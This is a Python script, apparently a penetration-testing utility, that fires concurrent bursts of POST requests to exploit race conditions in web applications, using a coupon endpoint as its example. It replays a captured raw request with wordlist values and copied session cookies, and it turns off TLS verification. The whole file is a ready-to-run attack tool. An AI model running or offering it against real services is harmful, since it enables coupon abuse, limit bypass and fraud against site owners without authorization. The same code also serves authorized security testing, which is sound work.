
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter
import time
import warnings
import urllib3
import os

warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailer", "transfer-encoding", "upgrade", "content-length", "host"
}


def read_rawfile(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        raw = f.read()

    head, body = "", ""
    if "\r\n\r\n" in raw:
        head, body = raw.split("\r\n\r\n", 1)
    elif "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        return [], {}, raw.strip()

    lines = head.strip().splitlines()
    headers = {}
    request_lines = lines[:]
    if lines:
        first = lines[0].strip()
        if first.upper().startswith(("GET ", "POST ", "PUT ", "DELETE ", "PATCH ", "OPTIONS ", "HEAD ")):
            header_lines = lines[1:]
        else:
            header_lines = lines

    for line in header_lines:
        if ": " in line:
            k, v = line.split(": ", 1)
            headers[k.strip()] = v.strip()
        elif ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()

    return request_lines, headers, body.strip()


def read_wordlist(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(f"wordlist not found: {path}")
    words = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            w = ln.strip()
            if w:
                words.append(w)
    return words


def replace_placeholders(parsed_headers, body, word):
    new_headers = {k: (v.replace("%s", word) if "%s" in v else v) for k, v in parsed_headers.items()}
    new_body = body.replace("%s", word) if body else body
    return new_headers, new_body


def prepare_session(headers):
    session = requests.Session()
    filtered_headers = {k: v for k, v in headers.items() if k.lower() not in HOP_BY_HOP_HEADERS}
    cookie_val = headers.get("Cookie") or headers.get("cookie")
    if cookie_val:
        for pair in cookie_val.split(";"):
            if "=" in pair:
                ck, cv = pair.split("=", 1)
                session.cookies.set(ck.strip(), cv.strip())
    if "Content-Type" not in filtered_headers and "content-type" not in (k.lower() for k in filtered_headers):
        filtered_headers["Content-Type"] = "application/x-www-form-urlencoded"
    return session, filtered_headers


def send_one(session, url, headers, body, timeout, proxies):
    try:
        r = session.post(url, headers=headers, data=body, timeout=timeout, proxies=proxies, verify=False)
        
        return r.status_code, len(r.content), r.content[:200].decode("utf-8", errors="replace")
    except requests.RequestException as e:
        return "Error", 0, str(e)


def chunked(iterable, size):
    for i in range(0, len(iterable), size):
        yield iterable[i:i + size]


def main():
    p = argparse.ArgumentParser(description="Race Condition burst sender (zar vs all modes) with burst-count")
    p.add_argument("--url", required=True, help="Target URL (full, e.g. https://target/cart/coupon)")
    p.add_argument("--rawfile", "-r", required=True, help="Raw packet file (headers+body or just body)")
    p.add_argument("--wordlist", "-w", required=True, help="File with replacement words, one per line")
    p.add_argument("--burst-size", type=int, default=30, help="Number of concurrent requests per burst (default 30)")
    p.add_argument("--burst-count", type=int, default=1, help="Number of bursts to run per word/chunk (default 1)")
    p.add_argument("--mode", choices=["zar", "all"], required=True, help="zar=تکی تکی (repeat same word), all=جمعی (different words per burst)")
    p.add_argument("--timeout", type=float, default=15.0, help="Request timeout seconds (default 15)")
    p.add_argument("--proxy", type=str, default=None, help="Optional proxy like http://127.0.0.1:8080")
    args = p.parse_args()

    request_lines, parsed_headers, body = read_rawfile(args.rawfile)
    words = read_wordlist(args.wordlist)
    if not words:
        print("[!] wordlist is empty.")
        return

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    print(f"[+] Target: {args.url}")
    print(f"[+] Words to try: {len(words)} (from {args.wordlist})")
    print(f"[+] Mode: {args.mode} | Burst size: {args.burst_size} | Burst count: {args.burst_count} | Timeout: {args.timeout}")
    if args.proxy:
        print(f"[+] Proxy: {args.proxy}")
    if parsed_headers:
        print(f"[+] Headers loaded from rawfile: {', '.join(parsed_headers.keys())}")

    grand = Counter()

    
    base_session, base_headers = prepare_session(parsed_headers)

    try:
        if args.mode == "zar":
            
            for wi, word in enumerate(words, start=1):
                headers_replaced, body_replaced = replace_placeholders(base_headers, body, word)
                print(f"\n=== [{wi}/{len(words)}] word='{word}' ===")
                for bi in range(1, args.burst_count + 1):
                    t0 = time.time()
                    outcomes = []
                    
                    with ThreadPoolExecutor(max_workers=args.burst_size) as exe:
                        futures = [exe.submit(send_one, base_session, args.url, headers_replaced, body_replaced, args.timeout, proxies)
                                   for _ in range(args.burst_size)]
                        for fut in as_completed(futures):
                            status, length, preview = fut.result()
                            outcomes.append((status, length))
                            grand.update([str(status)])
                    elapsed = time.time() - t0
                    
                    summary = Counter([o[0] for o in outcomes])
                    print(f"[word {wi} burst {bi}] sent {args.burst_size} reqs in {elapsed:.2f}s; summary: " +
                          ", ".join(f"{k}:{v}" for k, v in summary.items()))
                    
                    details = ", ".join(f"status={s}:len={l}" for (s, l) in outcomes)
                    print(" details:", details)

        else:  
            
            chunks = list(chunked(words, args.burst_size))
            for ci, chunk in enumerate(chunks, start=1):
                print(f"\n=== [chunk {ci}/{len(chunks)}] words={chunk} ===")
                
                per_word_prepared = []
                for word in chunk:
                    headers_replaced, body_replaced = replace_placeholders(base_headers, body, word)
                    
                    session = requests.Session()
                    
                    session.cookies.update(base_session.cookies)
                    per_word_prepared.append((word, session, headers_replaced, body_replaced))

                for bi in range(1, args.burst_count + 1):
                    t0 = time.time()
                    outcomes = []
                    with ThreadPoolExecutor(max_workers=len(per_word_prepared)) as exe:
                        futures = {
                            exe.submit(send_one, session, args.url, headers, body_replaced, args.timeout, proxies): word
                            for (word, session, headers, body_replaced) in per_word_prepared
                        }
                        for fut in as_completed(futures):
                            word_for = futures[fut]
                            status, length, preview = fut.result()
                            outcomes.append((word_for, status, length))
                            grand.update([str(status)])
                    elapsed = time.time() - t0
                    summary = Counter([o[1] for o in outcomes])
                    print(f"[chunk {ci} burst {bi}] sent {len(per_word_prepared)} reqs in {elapsed:.2f}s; summary: " +
                          ", ".join(f"{k}:{v}" for k, v in summary.items()))
                    details = ", ".join(f"{w}:status={s}:len={l}" for (w, s, l) in outcomes)
                    print(" details:", details)

    except KeyboardInterrupt:
        print("\nInterrupted by user.")

    print("\n=== GRAND SUMMARY ===")
    for k, v in grand.items():
        print(f"{k}: {v}")


if __name__ == "__main__":
    main()
